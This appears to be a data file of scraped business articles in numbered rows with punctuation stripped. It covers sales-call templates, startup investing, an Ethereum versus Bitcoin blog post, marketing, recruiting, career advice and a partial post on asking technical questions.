We implemented  PRODUCT FEATURE   and enabled  CUSTOMER NAME  to  WHAT DOES THE FEATURE ENABLE    CUSTOMER NAME  saw  QUANTIFIABLE RESULT    Use the following key to create your value based customer story with the template   CUSTOMER NAME   Who is one of your most successful customer examples  This can be a beta user if you don t have customers  Example   XYZ Scalability Corporation   QUALIFICATION CRITERIA   What are unique traits that would help you identify other customers who are similar to this customer  Be descriptive so it s easy to identify pairings  Cut by industry  employees  stage  tech stack  department  company size  milestone or team size  Example   SaaS  50 200 employees  Series B  Vertical Response  SFDC  ten sales people  CMO in place  six person marketing team   TITLE   Who in the organization did you sell to  Who had the biggest challenge  Each role within a company will have different obstacles  You ll want to look at these as you put together your value proposition  Example   VP of Marketing concerned with branding and lead conversion rates   EXAMPLE OF CUSTOMER PAIN POINTS   What were the customer s pain points before your solution  What did these pain points mean to their business  Example   Cancellation rates during onboarding had increased 12  over the last three months  Retention rates were dropping and the company s reputation was suffering   ADDITIONAL DETAIL   Use rich descriptive language to describe the customer example  Highlight details that relate to your prospect s pain points  Example   Onboarding emails weren t targeted to where a user was in the onboarding process  resulting in low click through rates  high unsubscribe rates and eventual cancellation   PRODUCT FEATURE  What product features were designed to address this challenge  Example   Automated behavioral email marketing   WHAT DOES THE FEATURE ENABLE  BENEFIT    How specifically does this feature solve the customer s challenge  Example   Email customers based on behavior in product  Send personalized emails to customers based on their specific onboarding path   QUANTIFIABLE RESULT  What statistical validation do you have to confirm that the pain point described by your customer was addressed by your solution  Example  Two months after we implemented automated behavioral email marketing  we d reduced the time to convert by 30  and increased overall conversions by 63   which translated to 4 2M in revenue for XYZ   INTEGRATING FOUNDING AND CUSTOMER STORIES INTO SALES  Early startup stories   those belonging to the founder and first customers   are just a piece of the greater machinery that make up an introductory sales conversation  Most sales processes stress asking the right questions  which is key to getting the information you need to convert a prospect   Yet progress with prospects is happening when your questions generate questions   as much as answers  In other words  the most valuable input from your prospects can be their questions   Questions not only mean the customer is engaging  but also transferring feedback that is process oriented or value oriented  They re working through how they re going to make a decision about your product with you  If they re asking questions  something s landed  That s a good sign   says Sales   If they ask about another customer  your example may not have been sufficiently relevant   that s a sign to change tacks and dig deeper into their pain points  Many people miss the fact that objections are a good thing  It s the customer telling you the challenges they ll face buying your product  If you find something continues not to land  ask another question and find another use case to redirect the conversation  Don t force it    Here s the overview of the process   Elements of the founder and early customer stories are vertical themes that are referenced throughout the sales pitch  but are concentrated in the first half of the conversation to build credibility early and get the prospect to open up  Here s how to fold in those stories and build out an effective sales call   Connect as a Human And Lead the Conversation  5 10 Minutes   Jumpstart with a giggle  1 3 minutes   Goal  To relate   or even better   laugh   How  Try citing something that you found out about the company  market or industry  Talk about a mutual connection  Share something that recently happened or how you re feeling  such as being wired on too much coffee  Self deprecation or a positive experience are reliable choices  Make yourself human   Tip   I like to start with laugher  if possible  Laughter establishes or restores a positive emotional climate and a sense of connection between two people  It literally forces two people to take pleasure in the company of one another   says Sales   Introduce succinctly  2 minutes   Goal  To give context and assume control of the conversation   How  Mention how you were connected  Give your name  title and a little something about yourself  Ask for names  titles and responsibilities  Introduce members of the team  if your colleagues are participating  Confirm how much time can be allotted for the conversation and thank them for taking the time   Tip   Take notes on who asks questions during the call and what questions they ask  If there are multiple people in the conversation  take notes on the dynamics between the people   says Sales   Try to determine the management style of the organization  This will tell you how a company or team is going to make a decision about a product and who you actually need to sell to in an organization  Are decisions made top down  by consensus  by executive committee or in another way    Assert the agenda  2 minutes   Goal  To get an understanding of _____ about them and discuss how you help them with ______  To outline next steps if there s a fit   How  Set a structure for when questions should be asked  Should they be ad hoc during the conversation or are you leaving time for questions at the end  Is it a discussion or a pitch  Always pause for questions as relevant to the structure of the call  Ask them their goals for the call and what they d like to make sure is covered   Tip  Here s how this information comes together in an example   My goals for the meeting today are to get a good understanding of how you currently do _____  Then to discuss how we can help you with _____ and if there s a fit  we can go over next steps  Sound like a plan  Great  Is there anything you d like to cover today  I d like to ask that we make this a discussion versus a pitch  I love to hear myself talk  but your questions are much more important to me  If you have any areas you d like to dive deeper into  please feel free to interrupt    Assess Fit  Cement Credibility and Pinpoint Value  20 30 Minutes   Deliver qualifying questions and answers  5 15 minutes   Goal  To determine if a prospect is a good customer for you   How  Ask value based questions  VBQ  and give value based responses  VBR   Your VBQs should collect what you need to know about the customer to know if they are a good customer for you  Taken another way  what do you need to know to identify a customer case study to share that will resonate with your prospect  You want to keep it at around two to three questions here  so make them count  Design your VBRs to share knowledge of your industry  educate the prospect and establish credibility   Tip   Casually mentioning a competitor in your VBR is a great way to pique curiosity and engage your customer  Statistics are also an effective way to guide a prospect s thinking and anchor the problem that you re solving for them   says Sales   Prove it with a story  2 3 minutes   Goal  To establish credibility through the experience of others   How  Cite a relatable customer story  outlined above  that establishes ROI for the prospect  If you have more than one  draw from your categorized story bank that s segmented by industry  customer title  problem  tech stack and so on in order to be maximally relatable  Tie the story back to the pain points you uncovered in your qualifying VBQs  If you don t have paying or beta customers yet  use your founding story or customer discovery conversations   Tip   Handle objections or concerns that the prospect may have by using customer examples  Here s a templated response   That s actually something we hear a lot  ______ had the same concern  _______ is how we addressed it for them    Veer toward value  5 15 minutes   Goal  To dive deep into the customer s pain points   How  Ask up to three VBQs to answer the following questions  What do you need to know about the customer to know the ROI you offer the customer  What do you need to know to put together a clear use case for the customer  In your VBR  empathize with the customer s pain  Place those issues alongside relevant customer examples and statistics   Tip   VBRs are not a pitch  They should be focused on relating to the customer s pain points  educating the customer on trends in the market and empathizing with the problem your product solves for the customer   says Sales   Construct a use case  2 5 minutes   Goal  To validate that you can help them and express how   How  Take the key benefits of your product that apply to your potential customer that you ve learned from your VBQs and back into a ROI calculation  if you can  Use the customer s description of her problem  pulling out keywords she uses to describe her pain points  Articulate what your product will mean for their business  Pause for questions   Tip   Be clear and concise  If you re doing a demo  show the specific aspect of the product that applies to their needs  You don t need to show the whole product  unless they need to see it in its entirety  It s not show and tell   says Sales   If you are a higher priced product  hold off on the demo until you have all the stakeholders in the room  Avoid using your product or deck as a crutch for sales conversations  Default toward asking questions if you don t know how the product might benefit the customer    Map The Close  10  Minutes   Decipher if and how they ll decide  5  minutes   Goal  To assess if they can act  Flush out objections and concerns  Understand their decision making process   How  Remember this acronym  BANT   which stands for Budget  Authority  Needs and Timeline  It s outlasted all the sales acronyms because it works  For budget  ask   How do you typically evaluate tools like this as a team  Is this something your prospect has resources and budget allocated for   For authority  you know who s on the call and their role  but still ask   Is there anyone else who would need to see the product or needs to be involved in the decision making process   Get an understanding of their role and why they care  For needs  you should have already established this at this point in the meeting  For timeline  ask   Have you ever purchased a tool like this before  What was the process like   Remember to ask about any legal or procurement processes that might extend or impact the sales process   Tip   After you feel that you fully understand what happens on their end after the call   if they did not buy on the call   repeat back what you learned and get confirmation that it s correct   says Sales   Nail down next steps  5  minutes   Goal  To clarify the next steps for them and for you  if you didn t close the deal in the conversation   How  Clearly state your to dos and confirm their homework  You should know what will happen when you conclude the conversation   Tip   If possible  schedule the next meeting and preview its agenda before you wrap up your conversation  This establishes an implicit deadline before the next meeting   says Sales   If asked the right questions  your customers will tell you everything you need to know in order to sell to them   Founders who are just starting to sell should look at their own story as the first customer story  They re the ones who not only identified a meaningful problem  but have personally acted to solve it  Having this problem in common forms a bridge to a prospect  across which a founder can cross to offer a solution  Early stage founders and salespeople must unabashedly reach for the founder s story until they collect use cases from early customers  Startups with green sales functions should run through Sales  exercises to create versions for both stories  Once created  teams can integrate these narratives into the structured sales calls she outlines    Founders gravitate to the future  thinking twenty steps ahead  So it s easy for them to let their past stories fade  But they can and should use them  By nature of being a founder  each entrepreneur has a founding story   and has used it  The first sale founders make with these stories is with themselves  They then used them to hire a team  raise money and attract beta customers   says Sales   This is the same narrative that a founder must pass on to the first salespeople in their organization  These templates should help crystalize that origin story and convert early champions into customers  Scale happens when these exercises enable salespeople to channel the founder s and customer s narratives  Unlike other resources  these stories aren t diluted as they re distributed  They re the most versatile  lasting assets at a startup s disposal  
11,business,Sam AltmanI m delighted to finally be investing in Asana  which I ve wanted to do for a long time   One of the things I ve learned about companies is that 1  clear tasks and goals  2  clearly communicated  and 3  with clear and frequent measurement are very important to success  Most companies fail at all 3 of these  and they become more important as companies get bigger  Asana is the best way to excel in these 3 areas    You make what you measure  is really true  and most companies don t measure well at all  I spend a lot of time talking to people who work at startups  and most employees feel like they don t have a good sense of what specifically the company needs to get done and how all the tasks are going  Better work tracking leads to better collaboration and better decision making   Another thing I ve learned investing in startups is how important it is to have some users that really love a product  instead of liking it pretty much   Asana has the level of product love that all great companies have in common  As a small example  their recurring revenue has been incredibly sticky and more than doubled every year   Asana is the kind of lever that could someday massively increase the productivity of hundreds of millions of people around the world  There s not only an opportunity for Asana to be a huge company  but also for Asana to materially increase the output for the planet somewhat amazingly  software has not yet eaten this important part of the world   Finally  Asana has an incredible team that  as far as I can tell as an outsider  really believes in the mission and loves the work environment  the Glassdoor reviews  something I check before every late stage investment  are among the best I ve ever seen    These are all the ingredients that go into the development of an incredibly impactful and valuable company  I m very happy to be along for the ride 
12,business,Ethereum is the Forefront of Digital Currency   The Coinbase BlogEthereum is the Forefront of Digital Currency  We have sat here for the last 3 years seeing only infrastructure apps like wallets and exchanges emerge on top of Bitcoin  Why is that   My theory has been that the scripting language in Bitcoin   the piece of every Bitcoin transaction that lets you run a little software program along with it   is too restrictive   Enter Ethereum  Ethereum has taken what was a four function calculator of a programming language in Bitcoin and turned it into a full fledged computer  We now stand only 9 months out from the beginning of the Ethereum network and the level of app development is already faster than Bitcoin s  We are finally getting rapid iteration at the app layer  In one early example  people have designed a decentralized organization  The DAO    a company whose heart is code and peripheral operations are run by humans  rather than the other way around   that has raised  150m so far in the largest crowdfunding ever   To be clear  I don t think this needs to be a contest between Bitcoin vs  Ethereum and Coinbase plans to strongly support both  I think this is about advancing digital currency as much as we can  There is a significant amount of overlap between the two  however  so the comparison is valuable and the potential for competition is real   How did we get here   First  some history  When the Bitcoin white paper emerged in 2008 it was completely revolutionary  The amount of concepts that had to come together in just the right way   computer science  cryptography  and economic incentives   was astonishing  When the actual Bitcoin network launched in 2009  no one knew about it  and many of those who did thought it would surely fail  Just to make sure the thing worked  the scripting language in Bitcoin was intentionally extremely restrictive   Scripting language  is a fancy way of saying an easy to work with programming language  in fact  Bitcoin doesn t exactly have a scripting language  it uses a stack with script operators   more on that later   The scripting language in Bitcoin is important because it is what makes Bitcoin  programmable money   Within each Bitcoin transaction is the ability to write a little program  For example  you can write a little program in a Bitcoin transaction that says  this transaction isn t valid unless it s June 15th  2016 or later   This is very powerful because you can move money automatically with computer code and everyone can see the rules by which that money moves and know those rules will be followed   It was  and still is  incredible that Bitcoin got off the ground and is alive after 7 years  It is the first network ever to allow anyone in the world to access a fundamentally open financial system through free software  It has   7bn in market cap and has never had a systemic issue which could not be fixed  To some this is already a great success   However  we also stand here 7 years into Bitcoin with few apps and no  killer apps  beyond store of value and speculation  The scripting language in Bitcoin has barely expanded and remains very restrictive  While Bitcoin has become embroiled in debate over the block size   an important topic for the health of the network  but not something that should halt progress in a young and rapidly developing field   Ethereum is charting new territory  both intellectually and executionally   Make no mistake   Ethereum would never have existed without Bitcoin as a forerunner  That said  I think Ethereum is ahead of Bitcoin in many ways and represents the bleeding edge of digital currency  I believe this for a few reasons   Ethereum s programming languages lets you do much more than Bitcoin s  As mentioned above  Bitcoin s scripting language is intentionally restrictive  You might liken it to programming with an advanced graphing calculator   functionality is limited  As a result  you can only do basic things  It is also hard to understand and use  Rather than most modern programming languages where the code is almost readable like a sentence  it looks like unintelligible machine code  As a result  it took Mike Hearn  a talented ex Google developer  a whopping 8 months to write a first version of a fairly simple crowdfunding application   In contrast  Ethereum s programming languages  Solidity for those who like Javascript  Serpent for those who like Python  let you do pretty much anything an advanced programming language would let you do  This is why they are said to be  Turing complete   Equally important  they are easy to use  It is simple for any developer to pick it up and quickly write their first app   Here s an example of a script in Bitcoin   OP_DUP OP_HASH160 62e907b15cbf27d5425399ebf6f0fb50ebb88f18 OP_EQUALVERIFY OP_CHECKSIG  And one in Ethereum s Solidity   contract Simple    function      var two   1   1         Developers at Coinbase have written simple Ethereum apps in a day or two   I cannot overemphasize enough how important this combination of full programming functionality and ease of use is  People are doing things in Ethereum that are not possible right now in Bitcoin  It has created a new generation of developers which never worked with Bitcoin but are interested in Ethereum   Bitcoin could have this advanced functionality  but it would be through a series of other layers that work with the Bitcoin protocol that haven t been created yet  while Ethereum is providing it out of the box   Beyond the radical difference in scripting languages  developer tools are much better in Ethereum  Bitcoin has never had a set of developer tools that caught on much  and they are sorely needed given it is much harder to work with Bitcoin out of the box  Ethereum has made life as a developer much easier  It has a welcoming homepage for devs and its own development environment  Mix IDE  amongst others   Ethereum has a more robust developer community  The developer community in Bitcoin feels fairly dormant  Bitcoin never really made it past the stage of simple wallets and exchanges  The most notable thing to be released recently is an implementation of the Lightning Network  a way of making transactions  especially microtransactions  more efficient  called Thunder  This is an additional protocol layer  not an application  however  and could be used by both Bitcoin and Ethereum   In contrast  Ethereum s developer community feels vibrant and growing  Most importantly  entirely new things are being tried on Ethereum  While most are experiments or toys at the moment  you can see a list of apps that developers from around the world which is rapidly expanding   Developer mindshare is the most important thing to have in digital currency  The only reason these networks  Bitcoin  Ethereum  and their tokens  bitcoin  ether  have value is because there is a future expectation that people will want to acquire those tokens to use the network  And developers create the applications which drive that demand  Without a reason to use the network  both the network and its currency are worth nothing   Ethereum s core development team is healthy while Bitcoin s is dysfunctional  Vitalik Buterin  the creator of Ethereum  has shown early promise as the leader of an open source project  He seems both comfortable as a community and technical leader  As an example  here s what he sent us when we added Ethereum to GDAX  our exchange   In contrast  Bitcoin has had a leadership vacuum since Gavin Andresen stepped aside after other core developers did not get on board with his  in my opinion rational and convincing  arguments to increase the block size   Core developers  as they now stand are also relatively fragmented   Beyond a leadership vacuum  Bitcoin s  leadership  is less clear and toxic  Greg Maxwell  technical leader of Blockstream which employs a solid chunk of core developers  recently referred to other core developers who were working with miners on a block size compromise as  well meaning dips   s   A second discussion board needed to form on reddit   r btc  because of censorship on the original  r bitcoin  The content on the Bitcoin discussion boards feels like squabbling while Ethereum s is talking about relevant issues and new ideas  In summary  Ethereum leadership  and as a result its community  is moving forward while things need to get worse before they can get better in Bitcoin   Ethereum has a growth mindset while Bitcoin has a false sense of accomplishment  The general mindset of the two communities feels different as well  Many in Bitcoin seem to have a false sense of  we ve got this really valuable network we need to protect    In my opinion that view is wrong and dangerous  Bitcoin is still orders of magnitude smaller than the major financial networks of the world at   200m day in transaction volume  Visa  18 billion day  SWIFT wire  5 trillion day  and  10 million users  5 billion in banks   And while transactions per day on Bitcoin seem to be increasing at a healthy pace  the actual   volume of transactions on Bitcoin is not growing much   Bitcoin transaction volume in peak times compared to other networks   we ve got a long way to go  Meanwhile  the core development team in Ethereum is focused  This is evident from the Ethereum blog  When I started reading it  it was everything I found myself thinking about for the present and future of Bitcoin but didn t see being discussed much  scaling the network  the viability of proof of stake  how to create a stable digital currency  what a blockchain based company  DAO  would look like  amongst other topics  These are very ambitious ideas and some won t work  But some probably will work  and they will be important   moving to proof of stake and eliminating physical mining being one of the most promising   Ethereum is making faster and more consistent technical progress on the core protocol  In Bitcoin  we have mostly been stuck on the block size debate for the last year and a half  Some minor improvements have been made  CHECKLOCKTIMEVERIFY to enable the time locking functionality mentioned earlier   and others are in development but not yet live  Segregated Witness to make the network more efficient   None of these changes have sparked much in the way of application development yet   Meanwhile  beyond the more robust programming language  Ethereum is making advancements that are core to even basic transactions  Its mining allows for much quicker blocks  and thus  transaction confirmation times   about 14 seconds on Ethereum compared to 10 minutes on Bitcoin  not an apples to apples comparison  but the larger point holds   This is largely due to the concept of miners getting paid for the work they put in whether or not they are the first to solve the next block  a system called  uncle blocks    While this system isn t perfect yet  it s meaningful forward progress towards quicker transaction confirmations   Counterargument and caveats  Ethereum is young and it s prudent to highlight the risks   Ethereum has been able to take more risk with new features because it is has had less to lose  Most of Ethereum s history has occurred while it has held in the hundreds of millions of dollars  while Bitcoin is in the billions  As Ethereum continues to grow  it may not be able to  move fast and break things  in the same way  In practice I think this mostly comes down to the quality of the core development team   if they continue to make progress and build trust with the community execution can still be rapid  as shown by Linus Torvalds with Linux as an open source project   Ethereum hasn t gone through a governance crisis  Vitalik acknowledged this at an Ethereum meetup we hosted at Coinbase  Like any project that has success  it s inevitable to hit bumps as peoples  vested interests get bigger   Ethereum allows you to do more than you currently can in Bitcoin  and that brings increased regulatory risk  This is less of a systemic risk to Ethereum as a network  rather more of a risk to specific applications of Ethereum  A good example would be decentralized organizations  ex  the DAO  and regulation which would normally apply to a corporation   There is a greater security risk with Ethereum  Having a more robust programming language creates a greater surface area for things to go wrong  Bitcoin has been battle tested for 7 years  Ethereum has been live for 9 months and now stores about  1bn  While there hasn t been a major issue yet  it is possible there are issues people are not yet aware of  This probability goes down with each passing day  People will definitely create smart contracts with bugs in Ethereum  This won t be because of a failure of the core Ethereum protocol though  much like the failure of Mt  Gox was not an error in the Bitcoin protocol   Ethereum may attempt to move to proof of stake  This would be a huge breakthrough if it works as it would eliminate the need for proof of work and all of the hardware and electricity use that goes with it  but also presents a large risk  I believe this risk is manageable because there would be extensive testing beforehand   Scaling the network is harder when it supports mini programs in addition to basic transaction processing  This was the biggest question I had when I started to read about the idea in 2014  While there is no silver bullet here  I think some combination of solutions will be developed over time as they are with any evolving technology  Some possibilities for Ethereum are sharding the network  computing power and networks naturally getting faster over time  and the economics of the Ethereum blockchain only running the most important things as a forcing function  There is a decent argument  best articulated by Gavin Andresen in his article Bit thereum  that it s better to keep the base transaction layer dumb for scaling reasons with advanced logic in higher layers  It s possible we come full circle and end up back there  but this isn t how interesting things are being created at the moment because it s harder to 1  create and 2  get decent adoption of multiple layers in the stack than it is to have it all out of the box in Ethereum   Wait   why is this a contest  Are Bitcoin and Ethereum competitors or complementary   This remains to be seen  It s possible Bitcoin remains the protocol that people are comfortable storing their value in because it is more stable and reliable  This would allow Ethereum to continue to take more risk by trying less tested advancements  In this scenario  Bitcoin is more of a settlement network while Ethereum is used to run decentralized applications  where most of the transaction volume occurs is up in the air   The two could be quite complementary   What is very real  though  is the possibility that Ethereum blows past Bitcoin entirely  There is nothing that Bitcoin can do which Ethereum can t  While Ethereum is less battle tested  it is moving faster  has better leadership  and has more developer mindshare  First mover advantage is challenging to overcome  but at current pace  it s conceivable   What does all this mean   It s all good news for digital currency  Ethereum is pushing the envelope and I am more excited than ever  Competition and new ideas create better outcomes for everyone  Even if Ethereum goes up in flames our collective knowledge in digital currency will have leveled up significantly  I have not given up on Bitcoin and it s hard to argue with a network that has been so resilient  I  and Coinbase  plan on supporting both  We ll probably support other things that haven t been invented yet in the future  At the end of the day  I have no allegiance to any particular network  I just want whatever brings the most benefit to the world   Taking a step back  it feels like the rate of change in digital currency is accelerating   Digital currency is a unique field because of how ambitious the scope is  creating a better transaction network for the entire world  for currency  assets  our online identities  and many other things   Like the Internet itself  this is not one company selling its own proprietary product  it is a series of low level protocols that will connect everyone someday  And  like the Internet  it will  and has  taken longer to develop  but the impact will be immense   Fasten your seatbelts 
13,business,The Best Content Marketers in the WorldThe Best Content Marketers in the World  I once asked a VP of Marketing at a top SaaS company how she thought of content programming  What is the right type of content to create  I asked her  She replied with a brilliant little insight   I look at way the best content marketers in the world do it  The TV networks    News dominates the early morning  Then  daytime television takes over targeting those who stay at home  At noon  news for those who power lunch  Soap operas and game shows after midday  News in the afternoon as people come home  Game shows  sitcoms  and drama for after dinner entertainment   She explained that networks focus each time segment on a particular persona  The length of the shows  their cadence  and their content all match the persona   Today  Netflix has developed even more sophisticated means of matching content to personas  They study which shows garner populations  Statisticians analyze the core ingredients of successful shows  With this insight  producers create new series embodying the right characteristics   The same ideas apply in SaaS  The most sophisticated content marketing teams mechanize this process with a calendar  The content marketing calendar identifies which persona receives which content each day  Also  marketers who plan content guide prospects and customers through a journey   The three steps of the buyer journey are awareness  consideration  decision  The steps of the customer journey differ by business  But they involve product education  community building  account management  All tasks key to customer success   Best in class content marketing is a discipline that requires careful planning and strategic thinking  Which personas matter  On which journey do they embark  What programming advances them  This effort does require substantial investment   But it can engender a sustainable competitive advantage for startups that reduces cost of customer acquisition and churn   Published 2017 03 15 in Marketing
14,business,Debugging Recruiting   Greylock PerspectivesDebugging Recruiting  Recruiting great people is a priority for any company at any stage of their growth  In the early stages  finding and hiring your initial team is core to instilling the right company culture  To hire effectively  founders and managers need to be thoughtful and organized about their recruiting process   from the first screening until delivering an offer  A sloppy and inconsistent process reflects poorly on the company  and can be the difference between a  Yes  I want to join  and  No  I don t think this is the right fit      As a Talent Partner at Greylock  I work with our portfolio and advise them on refining their recruiting processes  As such  I ve become familiar with many of the common problems that both new and experienced teams face when recruiting     Recently  I gave a talk that addresses some of these frequent  bugs  in the recruiting process  and want to share my presentation here more broadly  I go over the three stages of recruiting   sourcing  evaluation  and conversion   covering common mistakes made at each level as well as the questions you need to answer to avoid them     The full talk will be available on video and podcast soon  but for now here are the slides from my deck  I hope these thoughts and questions are helpful when thinking about your recruiting process 
15,business,Your Startup s Competitive AdvantageYour Startup s Competitive Advantage  Startups fail when they run out of money  Startups run out of money when they lack focus  Without a maniacal focus on serving customer needs in a unique way  startups can flounder amidst competition  Without product market fit  the business is challenged to generate strong metrics and faces fundraising challenges  That s why it s critical to identify and focus on your startup s competitive advantage   Most of the time  start up competitive advantages fallen to five categories  product  cost  positioning  distribution and execution   Product improvements are common startup differentiators  A better chat experience  a data modeling layer for data analysis  near instant transcription of expenses  All of these innovations are product innovations that cause users to switch to a new product  Product advantages can be replicated by competitors given enough time  but they often last several years or more   Cost is another competitive advantage when a new business understands how to minimize their costs relative to competitors  Amazon Web Services can offer low prices on infrastructure because of their scale  similar to their initial e commerce business  This pricing advantage is created by economies of scale  and once a leader emerges  it s very expensive to for others to catch up  Price advantages are more common when hardware or manufacturing are involved  because these types of expenses can be reduced at scale  Most software businesses costs are dominated by salary and very few businesses can outcompete their challengers by paying their employees substantially less   Positioning is a more amorphous competitive advantage but can be just as powerful as the rest  A premium brand versus a value brand  which is your startup  Responsys positioned itself as a premium email marketing company with an ACV of  250k   In contrast  Marketo s ACV was roughly  26k and ConstantContact  265  dollars   Each of these businesses ultimately exited for more than  1B   Another component of brand is category creation  By developing a brand that resonates with customers  that creates a category  and that sufficiently differentiates a business from its competitors  a startup can create a lasting competitive advantage  Gainsight is synonymous with customer success and Intercom for customer communication   Distribution advantages don t come around very often  It could be the dawn of search engine marketing  mobile app store distribution  enterprise apps or distribution  relationships with a key distribution channel  or novel marketing tactic  Dropbox refer a friend  Zendesk s community and referral marketing effort  Bill com relationship with a national bank  Xero courting accountants to acquire businesses  Distribution advantages place a startup s product in front of customers in a scalable  cost effective way that is difficult to replicate   Execution is a competitive advantage when the team is uniquely qualified to pursue and opportunity  David Duffield founded and ran PeopleSoft before starting Workday  a SaaS disruptor to an incumbent whose business he understood better than anybody else  Because after all he had built it   To be successful  a startup needs only one or two of these competitive differentiators to succeed  Trying to do all five increases the complexity and execution of the business  Consistently  the startups that differentiate based upon the founders  strengths  product  marketing  partnerships  expertise are the ones with stronger competitive advantages  Pick one or two for your business and focus on those   Published 2016 10 23 in Strategy
16,business,Good Strategy Bad Strategy  the difference and why it mattersUploaded on Oct 25  2011  Speaker s   Professor Richard Rumelt  Chair  Professor Gordon Barrass  Recorded on 20 October 2011 in Sheikh Zayed Theatre  New Academic Building     Developing and implementing a strategy is the central task of any leader  Richard Rumelt shows that there has been a growing and unfortunate tendency to equate motherhood and apple pie values and fluffy packages of buzzwords with  strategy      Richard Rumelt is the Harry and Elsa Kunin Professor of Business and Society at UCLA Anderson     An audio mp3 podcast is available here   http   www2 lse ac uk newsAndMedia vi   
17,business,Notes for the New YearHappy 2017   As a kid  I just sort of took for granted that stuff got better every year TVs got bigger and then thinner  cars got a little faster  and computers got unbelievably better on an exponential curve   As an adult  I realized that the future is not guaranteed to be better  The default is that things stay the same  or get worse because we continue to create new problems and occasionally get in wars   The world only gets better if committed people with strong visions about the future work hard to make it better   It s easy to get caught up in the moving sidewalk of a career and end up deeply involved in something that does not maximize your potential  It s never too late to change  and it s always good to be thoughtful about the path you re on and how to best use your time   I made some notes before my brother Jack interviewed me for How to Build the Future  where I mostly talked about how ambitious young people should think about their careers  I thought I d clean those up to share for the New Year  Here they are   On What To Work On  I think the best way to pick what you want to do is to find the intersection of what you re good at  what you enjoy  what the world needs  and what the world values   It s not easy to figure out what you actually care about  there are so many directions you can go  But rather than listening to where other people might push you  it s worth trying to figure this out for yourself  Don t chase other people s ideas of what matters  The best way to succeed long term is to deeply believe that what you re doing matters   Most people just fall into things that come their way  That can work   people sometimes just have to try stuff to figure out what they like   but I think it s worth being more deliberate  Try to develop and carefully refine strong convictions about what you want to accomplish   The framework I ve found most useful for helping people think through career decisions is to consider both impact maximization and regret minimization a decision that scores well on both is likely to be a good one   On Achieving Success  The way to get things done in the world is a combination of focus  personal connections  and self belief   You should work really hard  You should be willing to do whatever it takes  society doesn t owe you success  Be a doer  not a talker   history belongs to the doers   Whatever you choose to do  you ve got to believe in your own capacity to succeed  People will doubt you and think your goals are impossible or dumb  but you have to stand behind your convictions   It s ok to start off motivated by wanting to make a lot of money or wanting fame and glory  At some point though  most people need to find a deeper mission to keep pushing forward   The right way to think about your career is like compound interest  if you put in long hours at the start of your career and get a little bit better at what you do every day  you re going to accomplish more than others  That builds up a compound effect that will extend throughout your entire career  Life is obviously unfair and you don t know what will happen  but all else equal it becomes a major advantage   Enjoy your life when you re young   it s a true cliche that you only have your youth once   but work harder than most people think you should  I ve come to believe that burnout isn t so much associated with working too hard  but instead from things not working out  If you have momentum with whatever you re working on  you ll stay motivated and refreshed   Learn to say  yes  to an amazing opportunity even if you re not 100  sure how to do it or if you re ready it s possible to learn a lot very quickly  A mistake a lot of people make is to compare themselves to very successful people today  instead of the version of that person from ten years ago  which probably looks a lot more familiar   On Finding Your People  You want to find your tribe   the types of people like you that you can imagine working with for the rest of your career  Within that  you want to find a small group of people whom you trust  and whose opinions you really respect   You should probably be willing to move  For whatever you re interested in  there will be pockets of people around the world who are doing the best work  and it s worth getting as close to them as possible   Help others for no reason at all  When you re young  you tend to have a small network  and that limits your options  When you help people without any intention of ever getting benefit back  doors and new connections will open   this has been super important for me   On Giving Up  When some people try something and it doesn t work after a few weeks or months  they give up  I think that s way too early to quit   If people are saying that what you re doing or what you re making is bad  pay attention to that as feedback  but don t let it get to you personally  It s not a sign to give up  but instead to refine your approach   It s hard to say when is the right time to give up  but I think it s usually when you yourself feel you have run out of ideas  and you don t see any pathways to keep experimenting further   If you think you ve reached that point  by all means walk away  There s no glory in dragging things out if you re truly out of ideas  Shut down what you re working on  decompress  and try something new a few months later   If you re working on the right thing it will probably be really hard  It will likely take a long time and you ll face a lot of criticism  The super successful people I know spent a very long time pursuing their ideas  way past when most people would have given up  Keep pushing forward   On Taking Risk  Most people are wrong about what is risky and what is not  and so they don t take nearly enough risk  Take more risks  especially when you re early on in your career  being young and unknown is actually a major advantage because you have very little to lose   Don t let fear of failing stop you from taking risks  That is a risk itself  because you will miss out by not acting   If you do fail or end up in a crisis  you ll probably be OK  The more crises I ve faced in my life  the less scary each subsequent one has become  I m secure in the knowledge I ve made it through disaster before and I believe I will again   If you do something new and ambitious  be ready for doomsayers  Doing new things is hard both because you have to figure out how to do it and you have to deal with a constant barrage of negativity   Simple tip   don t be afraid to ask for what you want  If you re doing something ambitious  you ll be told  no   a lot  Sometimes though  people will give you what you want  Those times will outweigh the pains of being rejected  so be aggressive   On Money  When I was young  I had a misconception that you get rich from making a nice salary  As I got older  I realized the way to get rich was by owning things that go up in value i e   equity   I think that time is the major arbitrage opportunity still left in the market  People are increasingly focused on the short term  so there are lots of untouched opportunities that just take a long time to mature  I ve found that these types of bets have helped me generate the most value and wealth   One way to become an owner is to start a company  and there especially  it s best to take a long term approach  If you pick the right thing and devote yourself to growing it over the long run  you can make far more money than with a bunch of short term payouts along the way  If you aim big  you only have to be right once  Start early in your career  and if you fail  keep trying   As a general note  I think you should look for opportunities where if they work out  you will 10x your net worth  And if you have the option to invest in advancing yourself  do it   it s usually better than saving the money   On Thinking About The Future  Strong opinions about the future are valuable  Here again  the most interesting and successful people I know seem to all have strong ideas about what the future will look like  They are willing to be convinced with new data that they are wrong  but the bar for that is fairly high   I don t agree with the idea that the future is unknowable  There s a lot you can have conviction about that will happen or that you can make come true   Have strong opinions on where you want to go and then be flexible on the details 
18,business,How to ask good questionsAsking good questions is a super important skill when writing software  I ve gotten way better at it over the years  to the extent that it s something my coworkers comment on a lot   Here are a few guidelines that have worked well for me   To start out   I m actually kind of a big believer in asking dumb questions or questions that aren t  good   I ask people kind of dumb questions all the time  questions that I could have answered with Google or by searching our codebase  I mostly try not to  but sometimes I do it anyway and I don t think it s the end of the world   So this list of strategies isn t about  here are all the things you have to do before asking a question  otherwise you are a bad person and should feel bad  but rather  here are some things that have helped me ask better questions and get the answers I want     what s a good question   Our goal is going to be to ask questions about technical concepts that are easy to answer  I often have somebody with me who has a bunch of knowledge that I d like to know too  but they don t always know exactly how to explain it to me in the best way   If I ask a good series of questions  then I can help the person explain what they know to me efficiently and guide them to telling me the stuff I m interested in knowing  So let s talk about how to do that   State what you know  This is one of my favorite question asking techniques  This kind of question basically takes the form  State what you understand about the subject so far Ask  is that right    For example  I was talking to someone  a really excellent question asker  about networking recently  They stated  so  what I understand here is that there s some chain of recursive dns servers    That was not correct  There is actually no chain of recursive DNS servers   when you talk to a recursive DNS server there is only 1 recursive server involved  So them saying their understanding so far made it easy for us to clarify how it actually works   I was interested in rkt a while back  and I didn t understand why rkt took up so much more disk space than Docker when running containers    Why does rkt use more disk space than Docker 